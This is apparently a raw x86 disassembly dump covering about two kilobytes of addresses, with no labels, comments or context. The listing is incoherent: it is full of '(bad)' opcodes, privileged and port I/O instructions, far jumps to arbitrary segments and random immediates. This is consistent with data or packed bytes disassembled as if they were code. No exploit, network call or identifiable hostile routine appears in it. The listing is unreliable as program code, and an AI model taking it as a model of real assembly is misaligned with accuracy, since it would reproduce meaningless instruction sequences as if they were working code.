  41eb56:	pop    eax
  41eb57:	sub    ebp,DWORD PTR [ebx-0x6fecfce4]
  41eb5d:	scas   al,BYTE PTR es:[edi]
  41eb5e:	div    DWORD PTR [esi]
  41eb60:	cmp    DWORD PTR [edx+0x37],ecx
  41eb63:	sti    
  41eb64:	mov    esp,0x2d8bde88
  41eb69:	mov    BYTE PTR [eax+0xa35ee03],ch
  41eb6f:	int    0x0
  41eb71:	cmc    
  41eb72:	aam    0xd5
  41eb74:	mov    esi,0x747351a6
  41eb79:	or     DWORD PTR [bx+di],0xf355ac9c
  41eb80:	adc    eax,0xc2446a1e
  41eb85:	inc    BYTE PTR [edi-0x5a4761a7]
  41eb8b:	xchg   BYTE PTR [ebx],bh
  41eb8d:	pop    edi
  41eb8e:	fsubrp st(0),st
  41eb90:	add    BYTE PTR [ecx],bh
  41eb92:	dec    ecx
  41eb93:	mov    cl,0xc6
  41eb95:	aad    0x9f
  41eb97:	mov    al,ds:0x3c4da7ae
  41eb9c:	fisub  WORD PTR [esi+edx*4]
  41eb9f:	sahf   
  41eba0:	jle    0x41eb83
  41eba2:	sbb    dh,bh
  41eba4:	iret   
  41eba5:	mov    ebp,0xbdfef9fa
  41ebaa:	mov    ebp,0x9d4d09f2
  41ebaf:	sbb    DWORD PTR [eax],0xffffffc5
  41ebb2:	sub    eax,0xfd7c30a5
  41ebb7:	rcl    DWORD PTR [edx+0x6d],0x24
  41ebbb:	jo     0x41ec1b
  41ebbd:	aaa    
  41ebbe:	and    BYTE PTR [eax+0x60],cl
  41ebc1:	ins    BYTE PTR es:[edi],dx
  41ebc2:	mov    esi,0xec5ffb68
  41ebc7:	xor    dl,BYTE PTR [eax]
  41ebc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebca:	xchg   DWORD PTR [eax+esi*1+0x44866cb1],ecx
  41ebd1:	inc    eax
  41ebd2:	xor    al,0x8d
  41ebd4:	(bad)  
  41ebd5:	mov    ds:0x56ae1991,al
  41ebda:	leave  
  41ebdb:	pusha  
  41ebdc:	imul   edx,DWORD PTR [ecx+0x338658a3],0x34fe303f
  41ebe6:	jmp    0xad31:0xca40551d
  41ebed:	jle    0x41ebf8
  41ebef:	shl    BYTE PTR [ebx+0x57],cl
  41ebf2:	mov    ds:0x2dfc828d,eax
  41ebf7:	loopne 0x41ebb8
  41ebf9:	hlt    
  41ebfa:	outs   dx,BYTE PTR ds:[esi]
  41ebfb:	retf   
  41ebfc:	das    
  41ebfd:	and    al,0xc8
  41ebff:	or     al,0x5a
  41ec01:	pop    ebx
  41ec02:	xchg   bl,dh
  41ec04:	sub    eax,0x4c41713d
  41ec09:	push   ebx
  41ec0a:	sbb    eax,edx
  41ec0c:	enter  0x99ff,0x46
  41ec10:	sub    esp,ecx
  41ec12:	daa    
  41ec13:	cli    
  41ec14:	mov    ds:0x3a2f9b3d,al
  41ec19:	xchg   BYTE PTR [edx],bl
  41ec1b:	cmc    
  41ec1c:	ss cmp esi,esi
  41ec1f:	cmp    al,0x8
  41ec21:	in     eax,dx
  41ec22:	in     eax,dx
  41ec23:	pop    ebp
  41ec24:	mov    al,0xf6
  41ec26:	iret   
  41ec27:	sbb    DWORD PTR [edx-0x41],ebx
  41ec2a:	scas   eax,DWORD PTR es:[edi]
  41ec2b:	inc    esi
  41ec2c:	jne    0x41ec7f
  41ec2e:	or     edi,DWORD PTR [eax]
  41ec30:	mov    eax,ds:0xafdb82c3
  41ec35:	shr    esi,cl
  41ec37:	clc    
  41ec38:	sbb    al,0x73
  41ec3a:	ss mov bl,0x36
  41ec3d:	into   
  41ec3e:	test   DWORD PTR [ecx],0x287431f2
  41ec44:	inc    edi
  41ec45:	sbb    ah,bl
  41ec47:	imul   edi,DWORD PTR [eax-0x54],0xd64b7155
  41ec4e:	push   0xffffff95
  41ec50:	sub    esi,DWORD PTR [edx-0x6ff29434]
  41ec56:	hlt    
  41ec57:	je     0x41ec98
  41ec59:	pop    ecx
  41ec5a:	jno    0x41ebec
  41ec5c:	repnz sti 
  41ec5e:	push   es
  41ec5f:	add    BYTE PTR [ebx-0x1e],al
  41ec62:	enter  0x4e3,0x7a
  41ec66:	add    bl,0x32
  41ec69:	stos   DWORD PTR es:[edi],eax
  41ec6a:	pop    esp
  41ec6b:	std    
  41ec6c:	xchg   esi,eax
  41ec6d:	(bad)  
  41ec6e:	pop    es
  41ec6f:	scas   al,BYTE PTR es:[edi]
  41ec70:	sub    BYTE PTR [ebx-0x16],dl
  41ec73:	int3   
  41ec74:	xchg   BYTE PTR [bp+0x55],ch
  41ec78:	mov    ds:0x3734025f,eax
  41ec7d:	inc    ecx
  41ec7e:	arpl   WORD PTR ds:0x60eb8418,sp
  41ec84:	mov    ds:0xf3bc92c2,al
  41ec89:	or     eax,0x8bae8c74
  41ec8e:	add    ebp,ebp
  41ec90:	scas   al,BYTE PTR es:[edi]
  41ec91:	nop
  41ec92:	stc    
  41ec93:	pushf  
  41ec94:	retf   
  41ec95:	fimul  WORD PTR [edx]
  41ec97:	adc    DWORD PTR [esp+ebp*4+0x24a3c805],edi
  41ec9e:	in     eax,0x1
  41eca0:	add    eax,0xa21eb610
  41eca5:	outs   dx,DWORD PTR ds:[esi]
  41eca6:	xor    DWORD PTR [edx],edi
  41eca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecaa:	mov    bh,0x37
  41ecac:	adc    bl,BYTE PTR [edi]
  41ecae:	mov    eax,0x94f14cd4
  41ecb3:	pop    eax
  41ecb4:	das    
  41ecb5:	or     ecx,DWORD PTR [ebx-0xd994d8a]
  41ecbb:	aam    0xf5
  41ecbd:	hlt    
  41ecbe:	test   eax,0xe44287bb
  41ecc3:	mov    BYTE PTR [eax-0x55],dl
  41ecc6:	adc    ebp,edi
  41ecc8:	dec    DWORD PTR [edx]
  41ecca:	add    esp,DWORD PTR [ebx+eiz*1+0x67]
  41ecce:	push   ebp
  41eccf:	in     eax,dx
  41ecd0:	pop    edi
  41ecd1:	test   BYTE PTR [edi-0x6878bfdd],bh
  41ecd7:	fisttp DWORD PTR [esi-0x223b46d1]
  41ecdd:	sbb    DWORD PTR [ebx-0x4f],edi
  41ece0:	and    BYTE PTR [ebx],al
  41ece2:	js     0x41ecc5
  41ece4:	cmp    edx,esi
  41ece6:	aad    0x25
  41ece8:	lock aad 0xff
  41eceb:	mov    dl,BYTE PTR [edx+0x5dec3a9]
  41ecf1:	adc    DWORD PTR [ecx],ecx
  41ecf3:	out    0x94,al
  41ecf5:	jnp    0x41eca6
  41ecf7:	xchg   ebp,eax
  41ecf8:	fstp   QWORD PTR [ecx-0x78c6f190]
  41ecfe:	aad    0x4e
  41ed00:	inc    edi
  41ed01:	(bad)  
  41ed02:	cmp    al,0xbe
  41ed04:	sbb    eax,0xb0e60129
  41ed09:	inc    ecx
  41ed0a:	cmp    eax,DWORD PTR [ebp+0x3dffaaec]
  41ed10:	pop    ecx
  41ed11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed12:	dec    esi
  41ed13:	es fs mov ch,0x51
  41ed17:	adc    eax,0x32f5a446
  41ed1c:	inc    edx
  41ed1d:	sub    eax,ecx
  41ed1f:	push   edi
  41ed20:	sub    BYTE PTR [ebp+esi*1-0x7e],cl
  41ed24:	add    cl,BYTE PTR [ebx-0x4de501a4]
  41ed2a:	gs (bad) 
  41ed2c:	stc    
  41ed2d:	cmp    cl,BYTE PTR [ecx+0x17]
  41ed30:	clc    
  41ed31:	shr    DWORD PTR [ebx],1
  41ed33:	(bad)  
  41ed34:	sti    
  41ed35:	mov    esi,0xcf4ff3d5
  41ed3a:	pop    ds
  41ed3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed3c:	xor    al,0x81
  41ed3e:	jno    0x41ed07
  41ed40:	aaa    
  41ed41:	(bad)  
  41ed42:	setae  dh
  41ed45:	sbb    al,0x2f
  41ed47:	ror    BYTE PTR [ecx-0xd],1
  41ed4a:	and    bl,ah
  41ed4c:	jle    0x41ed2b
  41ed4e:	xchg   edi,eax
  41ed4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed50:	mov    dh,0x2b
  41ed52:	pop    ecx
  41ed53:	lds    eax,FWORD PTR [ecx+0x57]
  41ed56:	add    BYTE PTR [ebx],bh
  41ed58:	pop    ebx
  41ed59:	push   ds
  41ed5a:	pop    es
  41ed5b:	rcr    DWORD PTR [edi+edi*8+0x38],0xb2
  41ed60:	pop    ds
  41ed61:	xchg   esi,eax
  41ed62:	inc    edi
  41ed63:	sbb    BYTE PTR [ebx],0xdf
  41ed66:	mov    eax,0x49ac16e5
  41ed6b:	in     eax,dx
  41ed6c:	inc    ecx
  41ed6d:	mov    edx,DWORD PTR [eax]
  41ed6f:	test   eax,0xab09b4b5
  41ed74:	leave  
  41ed75:	xor    DWORD PTR [ecx],edi
  41ed77:	fstp   QWORD PTR [ecx]
  41ed79:	js     0x41edea
  41ed7b:	cld    
  41ed7c:	mov    esp,0xbb89de36
  41ed81:	cmp    al,0x1c
  41ed83:	jmp    0x7eaac7f0
  41ed88:	sti    
  41ed89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed8a:	xor    BYTE PTR [ebx-0x60d179e3],ah
  41ed90:	mul    eax
  41ed92:	jno    0x41ed24
  41ed94:	ins    BYTE PTR es:[edi],dx
  41ed95:	(bad)  
  41ed96:	dec    esp
  41ed97:	mov    edx,DWORD PTR [edx+0x4eeaddd5]
  41ed9d:	mov    al,0x43
  41ed9f:	jns    0x41ede9
  41eda1:	and    ch,BYTE PTR [ebx-0x5f54a501]
  41eda7:	jg     0x41edc3
  41eda9:	cmp    al,0x47
  41edab:	add    DWORD PTR [ebx],0xc7ec6a81
  41edb1:	loopne 0x41eddf
  41edb3:	pushf  
  41edb4:	and    cl,BYTE PTR [esi+0x3]
  41edb7:	mov    al,ds:0xefa858e1
  41edbc:	pop    ds
  41edbd:	frstor [esi]
  41edbf:	cmp    esp,DWORD PTR [esi]
  41edc1:	jbe    0x41ed72
  41edc3:	push   ebp
  41edc4:	js     0x41ed7a
  41edc6:	imul   eax,DWORD PTR [edx+ebp*8-0xe],0x4a
  41edcb:	add    ch,BYTE PTR ds:[edi-0x6d]
  41edcf:	xchg   ebx,eax
  41edd0:	sub    DWORD PTR [esi-0x73],esp
  41edd3:	dec    ebp
  41edd4:	aad    0xf1
  41edd6:	bound  ecx,QWORD PTR [esi]
  41edd8:	mov    ebx,0xa700901b
  41eddd:	(bad)  
  41edde:	pop    ebp
  41eddf:	lods   eax,DWORD PTR ds:[esi]
  41ede0:	pop    ebp
  41ede1:	fst    QWORD PTR [edi+0x42]
  41ede4:	xor    BYTE PTR [ecx],0xfe
  41ede7:	push   es
  41ede8:	mov    ah,0xb1
  41edea:	(bad)  
  41edeb:	pop    edx
  41edec:	mov    ebp,0xb05fed3e
  41edf1:	shr    ch,1
  41edf3:	rol    ecx,1
  41edf5:	popf   
  41edf6:	ds cli 
  41edf8:	cdq    
  41edf9:	dec    edi
  41edfa:	test   DWORD PTR [edx],eax
  41edfc:	mov    dh,0x3a
  41edfe:	add    esi,DWORD PTR [ebx+0x7f]
  41ee01:	imul   DWORD PTR [edi+0x50eb4e4c]
  41ee07:	push   esi
  41ee08:	js     0x41ee46
  41ee0a:	fcom   st(6)
  41ee0c:	mov    DWORD PTR [ecx+0x76],esp
  41ee0f:	mov    al,0x30
  41ee11:	jb     0x41edb6
  41ee13:	mov    dh,0x1d
  41ee15:	stos   DWORD PTR es:[edi],eax
  41ee16:	rcl    DWORD PTR ds:0x7ab63e8e,1
  41ee1c:	and    dh,0x52
  41ee1f:	daa    
  41ee20:	call   0xc384:0x8f55c975
  41ee27:	scas   eax,DWORD PTR es:[edi]
  41ee28:	loopne 0x41ee96
  41ee2a:	mov    ebp,0x3e2a68f
  41ee2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee30:	and    DWORD PTR [edi-0x2d52ab46],0xffffff83
  41ee37:	test   eax,0xa414343a
  41ee3c:	iret   
  41ee3d:	test   al,0xaf
  41ee3f:	sbb    cl,al
  41ee41:	or     edx,0xb7559
  41ee47:	xchg   edx,eax
  41ee48:	sub    DWORD PTR [esi+eiz*1+0x2510bb1e],ebp
  41ee4f:	stos   DWORD PTR es:[edi],eax
  41ee50:	lods   al,BYTE PTR ds:[esi]
  41ee51:	cmp    cl,dh
  41ee53:	fld    TBYTE PTR [edx+0x160f02e7]
  41ee59:	retf   
  41ee5a:	cld    
  41ee5b:	dec    ebp
  41ee5c:	jmp    0x41ee29
  41ee5e:	jmp    0x3be408d
  41ee63:	ficomp DWORD PTR [ecx]
  41ee65:	jne    0x41ede9
  41ee67:	shr    BYTE PTR [edx-0x5d303965],1
  41ee6d:	scas   eax,DWORD PTR es:[edi]
  41ee6e:	lock xchg BYTE PTR [esi-0x76],dl
  41ee72:	(bad)  
  41ee73:	(bad)
  41ee78:	jb     0x41ee91
  41ee7a:	sar    BYTE PTR [ebx+0x72],cl
  41ee7d:	xor    eax,0x7772bbf9
  41ee82:	fisubr DWORD PTR [edi+0x34]
  41ee85:	retf   0xb358
  41ee88:	in     eax,0x6f
  41ee8a:	les    ecx,FWORD PTR [esi-0x633fccb8]
  41ee90:	loop   0x41ee16
  41ee92:	jns    0x41eee9
  41ee94:	sub    bl,ch
  41ee96:	loope  0x41ef14
  41ee98:	push   ecx
  41ee99:	frndint 
  41ee9b:	pop    ebx
  41ee9c:	fistp  WORD PTR [edx-0x203cd92f]
  41eea2:	call   0x3952:0xaf9acb26
  41eea9:	popf   
  41eeaa:	aas    
  41eeab:	cmp    al,0xd3
  41eead:	inc    ecx
  41eeae:	or     ebx,esi
  41eeb0:	adc    BYTE PTR [edi-0x661bf0c2],dl
  41eeb6:	rcl    bh,cl
  41eeb8:	or     al,0x90
  41eeba:	sbb    eax,0x2f9faaca
  41eebf:	sub    ch,ch
  41eec1:	xchg   edi,eax
  41eec2:	outs   dx,BYTE PTR ds:[esi]
  41eec3:	test   DWORD PTR [ebp-0x32],edx
  41eec6:	(bad)  
  41eec8:	popa   
  41eec9:	loop   0x41eee4
  41eecb:	xchg   esi,eax
  41eecc:	mov    esp,0x46e5b6d6
  41eed1:	or     al,0x24
  41eed3:	(bad)
  41eed7:	arpl   WORD PTR [ebx+edx*2-0x4a0bb507],bp
  41eede:	test   BYTE PTR [eax],al
  41eee0:	retf   0x6dd6
  41eee3:	jge    0x41ee86
  41eee5:	sub    dl,BYTE PTR [ebx+0x25e95899]
  41eeeb:	fs mov ecx,eax
  41eeee:	sub    esp,ebp
  41eef0:	or     edi,ecx
  41eef2:	mov    cl,ah
  41eef4:	not    BYTE PTR [edx]
  41eef6:	mov    ebp,0xb97dcf
  41eefb:	adc    DWORD PTR [esp+eax*4],0xffffffc0
  41eeff:	jae    0x41eea4
  41ef01:	mov    ecx,0x6a477ea2
  41ef06:	sub    edi,DWORD PTR [ebx]
  41ef08:	fwait
  41ef09:	cmp    esp,DWORD PTR [edx+edx*4]
  41ef0c:	sub    al,0x35
  41ef0e:	cld    
  41ef0f:	outs   dx,BYTE PTR ds:[esi]
  41ef10:	sbb    dh,0xe4
  41ef13:	popf   
  41ef14:	test   DWORD PTR [ebx+0x1d],ebx
  41ef17:	les    esp,FWORD PTR [ebx]
  41ef19:	sbb    DWORD PTR [edi],edi
  41ef1b:	loope  0x41ee9d
  41ef1d:	adc    BYTE PTR [eax-0x14],cl
  41ef20:	pop    ss
  41ef21:	sbb    DWORD PTR ds:0xa4144853,esi
  41ef27:	call   0x7a79abfe
  41ef2c:	aam    0xd4
  41ef2e:	sub    BYTE PTR [eax],bl
  41ef30:	push   cs
  41ef31:	inc    eax
  41ef32:	enter  0xd1b0,0xdf
  41ef36:	mov    esp,0x93d81ac8
  41ef3b:	call   0xe3d4d629
  41ef40:	inc    ebx
  41ef41:	mov    ds:0xfe777abe,al
  41ef46:	adc    al,0x6
  41ef48:	jne    0x41efbd
  41ef4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4b:	outs   dx,DWORD PTR ds:[esi]
  41ef4c:	mov    esp,0x2266751e
  41ef51:	cli    
  41ef52:	inc    ecx
  41ef53:	ins    BYTE PTR es:[edi],dx
  41ef54:	adc    al,0xd9
  41ef56:	(bad)  
  41ef57:	or     al,BYTE PTR ss:[eax-0x54]
  41ef5b:	(bad)  
  41ef5c:	leave  
  41ef5d:	dec    ebp
  41ef5e:	xchg   edx,eax
  41ef5f:	popf   
  41ef60:	pushf  
  41ef61:	sub    eax,0x37410b4c
  41ef66:	and    eax,0x998d95dd
  41ef6b:	or     eax,0x101a2df0
  41ef70:	and    DWORD PTR [edi],0x2
  41ef73:	addr16 jo 0x41ef00
  41ef76:	test   eax,0xe68ce6b
  41ef7b:	mov    ds:0x12491360,eax
  41ef80:	sub    ah,bl
  41ef82:	imul   edi,DWORD PTR [eax-0x78],0xa7d77853
  41ef89:	ins    DWORD PTR es:[edi],dx
  41ef8a:	xor    eax,0x6d7c0b29
  41ef8f:	into   
  41ef90:	pop    ebp
  41ef91:	(bad)  
  41ef92:	cmp    DWORD PTR [edi+ebx*4],ebp
  41ef95:	dec    ebp
  41ef96:	cmp    edx,DWORD PTR [esi+0x5f]
  41ef99:	addr16 call 0xbd9be0bd
  41ef9f:	mov    ds:0x43ddc25d,al
  41efa4:	mov    bh,0xe2
  41efa6:	or     bh,bl
  41efa8:	mov    WORD PTR [ebx-0x388a3237],ds
  41efae:	jnp    0x41efe6
  41efb0:	dec    edi
  41efb1:	cmp    BYTE PTR [eax],ch
  41efb3:	cmp    cl,BYTE PTR cs:[eax]
  41efb6:	sbb    BYTE PTR [ebx],cl
  41efb8:	or     bl,dh
  41efba:	popa   
  41efbb:	(bad)  
  41efbc:	js     0x41ef88
  41efbe:	mov    bh,BYTE PTR [edx-0x4f]
  41efc1:	loop   0x41efed
  41efc3:	scas   eax,DWORD PTR es:[edi]
  41efc4:	dec    ebp
  41efc5:	pusha  
  41efc6:	dec    ebp
  41efc7:	jmp    0x904a73f1
  41efcc:	lods   al,BYTE PTR ds:[esi]
  41efcd:	pop    ds
  41efce:	or     eax,0x6a1efb9
  41efd3:	fxch   st(1)
  41efd5:	cdq    
  41efd6:	xor    edi,DWORD PTR [edi]
  41efd8:	push   ds
  41efd9:	cdq    
  41efda:	inc    esp
  41efdb:	sbb    eax,0xffa71ab1
  41efe0:	mov    al,ds:0x8b813159
  41efe5:	(bad)  [edi-0x49adff02]
  41efeb:	fwait
  41efec:	pusha  
  41efed:	inc    ecx
  41efee:	iret   
  41efef:	fstp   TBYTE PTR [ebx+0x54e3948f]
  41eff5:	rol    BYTE PTR [ecx+0x57],0x9e
  41eff9:	cmc    
  41effa:	repz rcr BYTE PTR [eax+0x512e8d30],0xb1
  41f002:	mov    edx,0x4449a5df
  41f007:	scas   al,BYTE PTR es:[edi]
  41f008:	or     eax,0xe49b9a57
  41f00d:	ins    BYTE PTR es:[edi],dx
  41f00e:	fbld   TBYTE PTR fs:[esi]
  41f011:	popf   
  41f012:	inc    edi
  41f013:	icebp  
  41f014:	test   al,0x95
  41f016:	dec    ebp
  41f017:	mov    BYTE PTR [edi+edx*4-0x6f0464a9],ch
  41f01e:	in     eax,dx
  41f01f:	add    al,BYTE PTR [edx+0x6835483b]
  41f025:	les    eax,FWORD PTR [esi+0x28]
  41f028:	inc    esi
  41f029:	test   DWORD PTR [edi],edi
  41f02b:	push   edx
  41f02c:	ins    BYTE PTR es:[edi],dx
  41f02d:	dec    ebp
  41f02e:	aad    0x8d
  41f030:	adc    dl,BYTE PTR [esi-0x6f]
  41f033:	fcomp  DWORD PTR [ebp-0x445c0faa]
  41f039:	push   es
  41f03a:	packssdw mm7,mm7
  41f03d:	jp     0x41efe5
  41f03f:	jne    0x41f087
  41f041:	ins    BYTE PTR es:[edi],dx
  41f042:	outs   dx,BYTE PTR ds:[esi]
  41f043:	outs   dx,BYTE PTR ss:[esi]
  41f045:	ret    
  41f046:	sub    esi,ebp
  41f048:	adc    bl,al
  41f04a:	test   al,0x3b
  41f04c:	lds    ecx,FWORD PTR [ecx-0x7266d505]
  41f052:	mov    dl,0x29
  41f054:	(bad)  
  41f055:	bound  edi,QWORD PTR [eax]
  41f057:	push   edi
  41f058:	test   DWORD PTR [ebx+eiz*1+0x1472df17],ecx
  41f05f:	jno    0x41f0db
  41f061:	push   esp
  41f062:	rcr    BYTE PTR [ecx-0x3a74ed92],1
  41f068:	pusha  
  41f069:	push   ss
  41f06a:	icebp  
  41f06b:	data16 jo 0x41f025
  41f06e:	sub    al,0xa1
  41f070:	or     eax,0xa5e67e9f
  41f075:	pushf  
  41f076:	test   al,0xbd
  41f078:	ss dec ecx
  41f07a:	test   eax,0x37abc2d0
  41f07f:	out    0xac,eax
  41f081:	out    0xaa,al
  41f083:	inc    esp
  41f084:	aaa    
  41f085:	fxch   st(0)
  41f087:	pop    ds
  41f088:	push   ss
  41f089:	mov    bl,0xf
  41f08b:	mov    ebx,0xbb83e1c6
  41f090:	retf   0xb0a
  41f093:	out    0x74,eax
  41f095:	jp     0x41f0d8
  41f097:	test   DWORD PTR [ecx],0x3c598ee1
  41f09d:	in     eax,0x5c
  41f09f:	lea    edi,[edx+0x4986cf78]
  41f0a5:	sbb    esp,DWORD PTR [ecx+ecx*1]
  41f0a8:	(bad)
  41f0ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ac:	mov    esp,0x13c34c54
  41f0b1:	mov    ds,WORD PTR [ebx+0x58]
  41f0b4:	sti    
  41f0b5:	sub    DWORD PTR [edx],esp
  41f0b7:	cmp    ebp,DWORD PTR [edx-0x12194412]
  41f0bd:	aaa    
  41f0be:	mov    dh,0x56
  41f0c0:	and    eax,0xfa692b01
  41f0c5:	mov    ds:0x32426606,al
  41f0ca:	shl    WORD PTR [esi-0x78],cl
  41f0ce:	stos   DWORD PTR es:[edi],eax
  41f0cf:	loopne 0x41f133
  41f0d1:	add    BYTE PTR [ebp+0x7c],ch
  41f0d4:	pop    fs
  41f0d6:	clc    
  41f0d7:	shr    eax,0xdc
  41f0da:	mov    dh,0xd3
  41f0dc:	jmp    0x41f0d0
  41f0de:	dec    edi
  41f0df:	pop    ecx
  41f0e0:	fisttp WORD PTR [eax-0x4d]
  41f0e3:	pop    ecx
  41f0e4:	or     BYTE PTR cs:[ebx+0x59aeda7b],dl
  41f0eb:	or     bh,bh
  41f0ed:	in     al,0xa3
  41f0ef:	mov    cl,0x72
  41f0f1:	repz leave 
  41f0f3:	ret    
  41f0f4:	pop    edx
  41f0f5:	(bad)  
  41f0f6:	pushf  
  41f0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f8:	ret    
  41f0f9:	mov    BYTE PTR [ebp-0x21],ch
  41f0fc:	call   0x244cf98c
  41f101:	pop    ebp
  41f102:	ret    
  41f103:	or     al,0x2
  41f105:	ret    
  41f106:	inc    edi
  41f107:	(bad)  
  41f108:	mov    ebp,0x1c6f8d20
  41f10d:	repnz dec eax
  41f10f:	or     BYTE PTR [ebx+edi*1-0x523df541],dh
  41f116:	loopne 0x41f109
  41f118:	jge    0x41f113
  41f11a:	arpl   WORD PTR [edx],dx
  41f11c:	inc    esp
  41f11d:	rcr    esi,1
  41f11f:	cmp    eax,esi
  41f121:	jno    0x41f0f7
  41f123:	arpl   WORD PTR [ebp+0x3f],bx
  41f126:	push   esi
  41f127:	lahf   
  41f128:	mov    ecx,0x6f2c2638
  41f12d:	out    0x5e,eax
  41f12f:	xor    al,0xca
  41f131:	inc    ebp
  41f132:	pop    es
  41f133:	push   esp
  41f134:	sub    DWORD PTR [esi+0x5b],0xd4d82705
  41f13b:	inc    eax
  41f13c:	fist   WORD PTR [esi+0x417e9f40]
  41f142:	xchg   DWORD PTR [esi+esi*8-0x7861e963],ebx
  41f149:	cmpxchg BYTE PTR [eax-0x35],cl
  41f14d:	mov    ecx,0x75475be8
  41f152:	pop    edx
  41f153:	cmc    
  41f154:	std    
  41f155:	jmp    0x41f0d8
  41f157:	or     al,0x4c
  41f159:	stos   BYTE PTR es:[edi],al
  41f15a:	dec    edx
  41f15b:	mov    ah,0x47
  41f15d:	lahf   
  41f15e:	pop    ecx
  41f15f:	jnp    0x41f189
  41f161:	sahf   
  41f162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f163:	mov    esp,esp
  41f165:	sbb    eax,0xe4071084
  41f16a:	cli    
  41f16b:	lds    ebx,FWORD PTR [eax+0x72]
  41f16e:	scas   al,BYTE PTR es:[edi]
  41f16f:	rol    BYTE PTR [ecx-0x1c05174a],cl
  41f175:	dec    esi
  41f176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f177:	or     eax,0x66924af4
  41f17c:	retf   0xedd6
  41f17f:	pop    ebx
  41f180:	cmp    eax,0xe82ee15f
  41f185:	idiv   DWORD PTR [edx+0x52cd3900]
  41f18b:	add    BYTE PTR [esi+esi*4+0x23],ch
  41f18f:	dec    esi
  41f190:	inc    esi
  41f191:	jno    0x41f130
  41f193:	jbe    0x41f1f3
  41f195:	out    0xdb,eax
  41f197:	(bad)  
  41f198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f199:	mov    al,0x60
  41f19b:	imul   BYTE PTR [ebx+0x1d]
  41f19e:	cs mov edi,0xa355da12
  41f1a4:	add    eax,0x4e153281
  41f1a9:	mov    bh,0x57
  41f1ab:	(bad)  
  41f1ac:	sbb    al,BYTE PTR [edi+ecx*4]
  41f1af:	push   0xffffffa9
  41f1b1:	push   ebp
  41f1b2:	push   0x19
  41f1b4:	xor    ah,dh
  41f1b6:	lahf   
  41f1b7:	mov    ecx,0xad922805
  41f1bc:	cmp    eax,esi
  41f1be:	out    dx,eax
  41f1bf:	mov    eax,ds:0xf12322a
  41f1c4:	nop
  41f1c5:	push   esi
  41f1c6:	aam    0x60
  41f1c8:	ficom  DWORD PTR [esi+ecx*1]
  41f1cb:	das    
  41f1cc:	inc    ebp
  41f1cd:	mov    edi,0x7f4f8ba8
  41f1d2:	jnp    0x41f18a
  41f1d4:	push   edi
  41f1d5:	pop    ss
  41f1d6:	add    cl,bl
  41f1d8:	aas    
  41f1d9:	nop
  41f1da:	clc    
  41f1db:	jns    0x41f204
  41f1dd:	jecxz  0x41f17d
  41f1df:	dec    edx
  41f1e0:	dec    ebx
  41f1e1:	adc    DWORD PTR [ebp-0x1d6ebbc3],ebp
  41f1e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1e8:	dec    esi
  41f1e9:	ds ins DWORD PTR es:[edi],dx
  41f1eb:	mov    edx,0x8208debd
  41f1f0:	mov    gs:0x86bae769,al
  41f1f6:	add    BYTE PTR [ebx-0x3f],dl
  41f1f9:	lahf   
  41f1fa:	mov    ebx,0x4d054e46
  41f1ff:	xchg   ebx,edi
  41f201:	xchg   ebp,eax
  41f202:	push   edi
  41f203:	(bad)  
  41f204:	data16 aam 0xc5
  41f207:	and    DWORD PTR [ecx+0x618b297e],0x0
  41f20e:	adc    BYTE PTR [edi-0x3f195e3c],dh
  41f214:	ret    
  41f215:	or     DWORD PTR [ebp+0x458bd294],eax
  41f21b:	out    0x9f,eax
  41f21d:	cmp    DWORD PTR [ebx+0x34feffdf],esp
  41f223:	mov    DWORD PTR [edx+0x29fbc38b],esi
  41f229:	neg    DWORD PTR [ebx+0x1f]
  41f22c:	frstor [ecx+0x7493291e]
  41f232:	or     al,BYTE PTR [eax-0x6457167e]
  41f238:	push   ebp
  41f239:	adc    DWORD PTR [ecx+0x7edd85d9],ecx
  41f23f:	sub    eax,0xd3689842
  41f244:	add    ah,al
  41f246:	jg     0x41f218
  41f248:	or     al,0x4b
  41f24a:	out    0x38,eax
  41f24c:	xchg   BYTE PTR [ebx+esi*2],dh
  41f24f:	mov    BYTE PTR [edx],dh
  41f251:	bnd jbe 0x41f2b6
  41f254:	mov    eax,ds:0xf1fd3c88
  41f259:	cmp    ebp,eax
  41f25b:	ds push ebx
  41f25d:	xor    eax,0xa71a2a00
  41f262:	mov    al,0x39
  41f264:	cwde   
  41f265:	xor    esi,DWORD PTR [ecx+0x38]
  41f268:	ret    
  41f269:	sbb    al,BYTE PTR ss:[eax+0x42b560db]
  41f270:	pop    ebx
  41f271:	fiadd  WORD PTR [esi+0x34]
  41f274:	xchg   esi,eax
  41f275:	outs   dx,BYTE PTR ds:[esi]
  41f276:	xor    esp,DWORD PTR [ebp-0x17]
  41f279:	and    al,0xcf
  41f27b:	cmp    edx,DWORD PTR [esi+0x7cf8045]
  41f281:	cmp    ecx,ecx
  41f283:	cli    
  41f284:	ja     0x41f2b0
  41f286:	mov    dh,0xb9
  41f288:	sub    eax,0x9b4d5c11
  41f28d:	jecxz  0x41f2a2
  41f28f:	jle    0x41f256
  41f291:	and    DWORD PTR [ebx],eax
  41f293:	retf   
  41f294:	std    
  41f295:	fsubr  DWORD PTR [ebp-0x9]
  41f298:	call   0x14c26ab6
  41f29d:	loope  0x41f280
  41f29f:	mov    esi,0x49fab678
  41f2a4:	jge    0x41f264
  41f2a6:	retf   
  41f2a7:	jge    0x41f2c0
  41f2a9:	xor    eax,0x57ba493
  41f2ae:	or     BYTE PTR [ebx],bl
  41f2b0:	cmp    DWORD PTR [ebp+0x42123778],eax
  41f2b6:	sbb    al,0x9d
  41f2b8:	shl    BYTE PTR [edi+0x6ad9c45e],cl
  41f2be:	mov    ds:0xfb41df85,eax
  41f2c3:	or     al,0x3d
  41f2c5:	mov    cs,WORD PTR [eax-0x64bc7374]
  41f2cb:	ret    
